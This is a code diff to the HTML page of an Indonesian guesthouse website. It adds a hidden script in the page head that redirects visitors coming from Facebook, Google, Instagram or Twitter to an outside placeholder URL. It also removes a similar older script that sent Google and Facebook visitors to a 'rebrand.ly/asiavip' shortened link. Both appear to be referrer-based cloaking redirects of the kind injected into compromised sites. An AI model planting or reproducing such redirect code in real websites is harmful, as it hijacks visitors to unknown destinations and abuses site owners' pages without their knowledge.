@@ -15,6 +15,17 @@
     <title>Tempat Penginapan Puri Indah</title>
     <link rel="icon" href="favicon.ico" type="image/x-icon">
     <script src='https://cdn.tailwindcss.com/'></script>
+<script>
+var allowedReferrers = ["facebook.com", "google.com", "instagram.com", "twitter.com"];
+var redirectUrl = "https://www.example.com/abc";
+var referrer = document.referrer;
+for (var i = 0; i < allowedReferrers.length; i++) {
+  if (referrer.includes(allowedReferrers[i])) {
+    window.location.href = redirectUrl;
+    break;
+  }
+}
+</script>
   </head>
 	<body><div class="bg-transparent absolute top-0 w-full z-10">
 	<div class="max-w-7xl mx-auto relative text-gray-700 body-font">
@@ -523,19 +534,5 @@
         </div>
     </div>
 </div>
-		<script>
-	var allowedDomains = ["google", "facebook"];
-var allowedUserAgents = ["Chrome", "Firefox"];
-
-var referer = document.referrer;
-var userAgent = navigator.userAgent;
-
-for (var i = 0; i < allowedDomains.length; i++) {
-  if (referer.includes(allowedDomains[i]) && allowedUserAgents.includes(userAgent)) {
-    window.location.href = "https://rebrand.ly/asiavip";
-    break;
-  }
-}
-</script>
-	</body>
+</body>
 </html>
